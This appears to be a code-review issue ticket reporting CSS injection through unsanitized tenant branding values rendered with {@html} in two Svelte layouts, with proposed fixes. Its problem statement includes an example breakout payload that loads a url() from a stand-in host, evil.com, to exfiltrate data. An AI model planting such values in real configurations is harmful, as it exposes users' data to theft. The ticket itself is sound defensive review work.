---
status: pending
priority: p2
issue_id: "088"
tags: [code-review, security, css-injection, frontend]
dependencies: []
---

# CSS injection via unsanitized branding values in {@html style} tag

## Problem Statement

Both root layouts use `{@html \`<style>:root { ${brandingCSS} }</style>\`}` (credit:54, wealth:57). The `brandingToCSS()` function in `@netz/ui/utils/branding.ts:52-62` concatenates branding config values into CSS without sanitization.

If a tenant admin sets `primary_color` to a malicious value like `#fff; } body { background: url(//evil.com/steal)}`, it breaks out of the CSS variable declaration and injects arbitrary CSS. CSS injection can be used for data exfiltration via `url()` selectors targeting attribute values.

## Findings

- `frontends/credit/src/routes/+layout.svelte:54` — `{@html}` for branding CSS
- `frontends/wealth/src/routes/+layout.svelte:57` — same pattern
- `packages/ui/src/lib/utils/branding.ts:58` — `parts.push(\`${varName}: ${value}\`)` — no sanitization
- Branding values come from `ConfigService` (DB-backed), settable by tenant admins
- CSS-based attacks: data exfiltration via `url()`, UI manipulation, phishing via overlays

## Proposed Solutions

### Option 1: Sanitize CSS values in brandingToCSS

**Approach:** Validate each value matches expected format (hex color, font name) before including. Strip `;`, `}`, `{`, `url(`, `@import`.

**Effort:** 1 hour

**Risk:** Low

---

### Option 2: Use element.style.setProperty instead of {@html}

**Approach:** Use `injectBranding()` (already exists at branding.ts:67) via `$effect` on `document.documentElement` instead of `{@html}` style injection.

**Pros:**
- `setProperty()` automatically escapes values
- No `{@html}` needed
- Function already exists

**Effort:** 30 minutes

**Risk:** Low

## Recommended Action

**To be filled during triage.**

## Technical Details

**Affected files:**
- `packages/ui/src/lib/utils/branding.ts:52-62`
- `frontends/credit/src/routes/+layout.svelte:54`
- `frontends/wealth/src/routes/+layout.svelte:57`

## Acceptance Criteria

- [ ] Branding CSS values cannot break out of CSS variable declarations
- [ ] Malicious values like `#fff; } .evil { }` are either stripped or safely escaped
- [ ] Tests for CSS injection attempts in branding values

## Work Log

### 2026-03-16 - Code Review Discovery

**By:** Claude Code (ce:review PRs #37-#45)

## Resources

- **PRs:** #37, #39, #41 (Phases A, B, C)
